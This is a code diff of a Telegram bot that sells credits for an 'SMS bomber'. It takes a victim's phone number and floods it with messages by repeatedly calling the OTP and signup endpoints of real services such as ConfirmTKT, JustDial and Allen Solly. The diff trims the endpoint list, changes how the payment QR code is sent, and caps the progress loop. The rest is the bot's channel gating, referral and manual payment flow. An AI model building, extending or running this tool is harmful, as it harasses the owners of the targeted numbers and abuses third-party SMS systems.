@@ -8,7 +8,8 @@ import random
 from telegram import (
     Update, 
     InlineKeyboardButton, 
-    InlineKeyboardMarkup
+    InlineKeyboardMarkup,
+    InputMediaPhoto
 )
 from telegram.ext import (
     Application, 
@@ -28,8 +29,8 @@ ADMIN_ID = 6847499628
 CHANNEL_USERNAME = "@EscrowMoon"
 CHANNEL_ID = -1002699957030
 
-# Payment QR code
-PAYMENT_QR = "https://i.ibb.co/r23tNL7G/IMG-20251108-221531-574.jpg"
+# Payment QR code - Direct image URL
+PAYMENT_QR_URL = "https://i.postimg.cc/qBXmX2pP/IMG-20251115-190606-343.jpg"
 
 # Credit packages
 CREDIT_PACKAGES = {
@@ -192,7 +193,7 @@ def is_verified(user_id):
     user = get_user(user_id)
     return user and user[9] == 1
 
-# Enhanced SMS Bomber Class (Using your APIs)
+# Enhanced SMS Bomber Class
 class UltimateSMSBomber:
     def __init__(self, phone_number, country_code="91", message_count=10):
         self.phone = phone_number
@@ -208,9 +209,7 @@ class UltimateSMSBomber:
         self.apis = self._load_all_apis()
     
     def _load_all_apis(self):
-        """Load all APIs from your provided list"""
         apis = [
-            # ConfirmTKT
             {
                 "name": "ConfirmTKT",
                 "method": "GET",
@@ -218,7 +217,6 @@ class UltimateSMSBomber:
                 "params": {"newOtp": "true", "mobileNumber": self.phone},
                 "identifier": "false"
             },
-            # JustDial
             {
                 "name": "JustDial",
                 "method": "GET",
@@ -226,80 +224,12 @@ class UltimateSMSBomber:
                 "params": {"mobile": self.phone},
                 "identifier": "sent"
             },
-            # Allen Solly
             {
                 "name": "Allen Solly",
                 "method": "POST",
                 "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                 "data": {"mobileoremail": self.phone, "name": "markluther"},
                 "identifier": "true"
-            },
-            # Frotels
-            {
-                "name": "Frotels",
-                "method": "POST",
-                "url": "https://www.frotels.com/appsendsms.php",
-                "data": {"mobno": self.phone},
-                "identifier": "sent"
-            },
-            # GAPOON
-            {
-                "name": "GAPOON",
-                "method": "POST",
-                "url": "https://www.gapoon.com/userSignup",
-                "data": {
-                    "mobile": self.phone,
-                    "email": "noreply@gmail.com",
-                    "name": "LexLuthor"
-                },
-                "identifier": "1"
-            },
-            # Housing
-            {
-                "name": "Housing",
-                "method": "POST",
-                "url": "https://login.housing.com/api/v2/send-otp",
-                "data": {"phone": self.phone},
-                "identifier": "Sent"
-            },
-            # Porter
-            {
-                "name": "Porter",
-                "method": "POST",
-                "url": "https://porter.in/restservice/send_app_link_sms",
-                "data": {"phone": self.phone, "referrer_string": "", "brand": "porter"},
-                "identifier": "true"
-            },
-            # Cityflo
-            {
-                "name": "Cityflo",
-                "method": "POST",
-                "url": "https://cityflo.com/website-app-download-link-sms/",
-                "data": {"mobile_number": self.phone},
-                "identifier": "sent"
-            },
-            # NNNOW
-            {
-                "name": "NNNOW",
-                "method": "POST",
-                "url": "https://api.nnnow.com/d/api/appDownloadLink",
-                "data": {"mobileNumber": self.phone},
-                "identifier": "true"
-            },
-            # AJIO
-            {
-                "name": "AJIO",
-                "method": "POST",
-                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
-                "data": {
-                    "firstName": "xxps",
-                    "login": "wiqpdl223@wqew.com",
-                    "password": "QASpw@1s",
-                    "genderType": "Male",
-                    "mobileNumber": self.phone,
-                    "requestType": "SENDOTP"
-                },
-                "identifier": "1"
             }
         ]
         return apis
@@ -349,19 +279,17 @@ class UltimateSMSBomber:
             return False
     
     def start_bombing(self):
-        """Start bombing with limited messages"""
         self.active = True
         self.sent_count = 0
         
         def bomb_worker():
             while self.active and self.sent_count < self.message_count:
-                # Shuffle APIs for each cycle
                 random.shuffle(self.apis)
                 for api in self.apis:
                     if not self.active or self.sent_count >= self.message_count:
                         break
                     self._send_request(api)
-                    time.sleep(0.5)  # Reduced delay for faster bombing
+                    time.sleep(0.5)
         
         thread = threading.Thread(target=bomb_worker)
         thread.daemon = True
@@ -411,20 +339,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = update.effective_user.username
     first_name = update.effective_user.first_name
     
-    # Update user in database
     update_user(user_id, username, first_name)
     
-    # Handle referral - FIXED
     referred_by = None
     if context.args:
         try:
             referred_by = int(context.args[0])
             if referred_by != user_id:
-                # Check if this user was already referred
                 user_data = get_user(user_id)
-                if user_data and not user_data[5]:  # referred_by is None
+                if user_data and not user_data[5]:
                     add_referral(referred_by)
-                    # Set referred_by for current user
                     conn = sqlite3.connect('users.db')
                     cursor = conn.cursor()
                     cursor.execute('UPDATE users SET referred_by = ? WHERE user_id = ?', (referred_by, user_id))
@@ -433,12 +357,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except ValueError:
             pass
     
-    # Check if user is verified
     if is_verified(user_id):
         await show_main_menu(update, context)
         return
     
-    # Show subscription required message
     welcome_text = f"""
 👋 **Welcome {first_name}!**
 
@@ -473,9 +395,7 @@ async def verify_subscription(update: Update, context: ContextTypes.DEFAULT_TYPE
     await query.answer()
     user_id = query.from_user.id
     
-    # Check subscription
     if await check_subscription(update, context):
-        # Mark user as verified
         mark_verified(user_id)
         await query.edit_message_text("✅ Verification successful! Loading main menu...")
         await show_main_menu(update, context)
@@ -648,15 +568,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         package = query.data.split("_")[1]
         details = CREDIT_PACKAGES[package]
         
-        payment_text = f"""
+        # Send QR code as image
+        try:
+            await context.bot.send_photo(
+                chat_id=query.message.chat_id,
+                photo=PAYMENT_QR_URL,
+                caption=f"""
 💳 **Payment Details**
 
 📦 **Package:** {details['credits']} Credits
 💰 **Amount:** ₹{details['price']}
 🎯 **Rate:** 1 Credit = 1 SMS
-
-📸 **Payment QR Code:**
-{PAYMENT_QR}
 
 **Payment Instructions:**
 1. Scan the QR code above
@@ -665,14 +587,35 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 4. Send your UTR Number
 
 💡 **Note:** Payments are verified manually within 1 hour.
+""",
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logging.error(f"Error sending QR image: {e}")
+            payment_text = f"""
+💳 **Payment Details**
+
+📦 **Package:** {details['credits']} Credits
+💰 **Amount:** ₹{details['price']}
+🎯 **Rate:** 1 Credit = 1 SMS
+
+📸 **Payment QR Code:**
+{PAYMENT_QR_URL}
+
+**Payment Instructions:**
+1. Scan the QR code above
+2. Pay exactly ₹{details['price']}
+3. Click 'Confirm Payment'
+4. Send your UTR Number
 """
+            await query.edit_message_text(payment_text, parse_mode='Markdown')
         
         keyboard = [
             [InlineKeyboardButton("✅ Confirm Payment", callback_data=f"confirm_{package}")],
             [InlineKeyboardButton("❌ Cancel", callback_data="buy_credit")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(payment_text, reply_markup=reply_markup, parse_mode='Markdown')
+        await query.edit_message_text("Click the button below after scanning QR:", reply_markup=reply_markup)
     
     elif query.data.startswith("confirm_"):
         package = query.data.split("_")[1]
@@ -726,7 +669,6 @@ async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE
             country_code = country_code.strip()
             phone = phone.strip()
             
-            # Validate phone number
             if not (country_code.isdigit() and phone.isdigit()):
                 await update.message.reply_text("❌ Invalid phone number format. Use numbers only.")
                 return WAITING_PHONE
@@ -738,7 +680,7 @@ async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE
         # Deduct credits
         update_credits(user_id, -bomb_count)
         
-        # Start bombing - FIXED
+        # Start bombing
         bomber = UltimateSMSBomber(phone, country_code, bomb_count)
         context.user_data['bomber'] = bomber
         start_result = bomber.start_bombing()
@@ -772,7 +714,10 @@ async def monitor_bombing_progress(update: Update, context: ContextTypes.DEFAULT
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     
-    while bomber.active and bomber.sent_count < bomber.message_count:
+    max_attempts = 50
+    attempts = 0
+    
+    while bomber.active and bomber.sent_count < bomber.message_count and attempts < max_attempts:
         try:
             progress = bomber.get_progress()
             progress_text = f"""
@@ -799,7 +744,8 @@ async def monitor_bombing_progress(update: Update, context: ContextTypes.DEFAULT
                 parse_mode='Markdown'
             )
             
-            await asyncio.sleep(2)
+            await asyncio.sleep(3)
+            attempts += 1
             
         except Exception as e:
             break
@@ -819,12 +765,15 @@ async def monitor_bombing_progress(update: Update, context: ContextTypes.DEFAULT
 
 💎 **Credits used:** {bomber.message_count}
 """
-        await context.bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=final_text,
-            parse_mode='Markdown'
-        )
+        try:
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=final_text,
+                parse_mode='Markdown'
+            )
+        except:
+            pass
 
 async def handle_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -837,12 +786,11 @@ async def handle_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     details = CREDIT_PACKAGES[package]
     
-    # Add payment to database - FIXED
     add_payment(user_id, package, details['price'], details['credits'], utr)
     
     user = get_user(user_id)
     
-    # Notify admin - FIXED
+    # Notify admin
     admin_text = f"""
 💰 **New Payment Request**
 
@@ -860,7 +808,7 @@ async def handle_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logging.error(f"Failed to notify admin: {e}")
     
-    # Notify user - FIXED
+    # Notify user
     user_text = f"""
 ✅ **Payment Received**
 
@@ -899,7 +847,6 @@ async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await update.message.reply_text(f"✅ Added {amount} credits to user {target[2]} (@{target[1]})")
         
-        # Notify user
         try:
             await context.bot.send_message(target_user, f"🎉 You received {amount} credits from admin!")
         except:
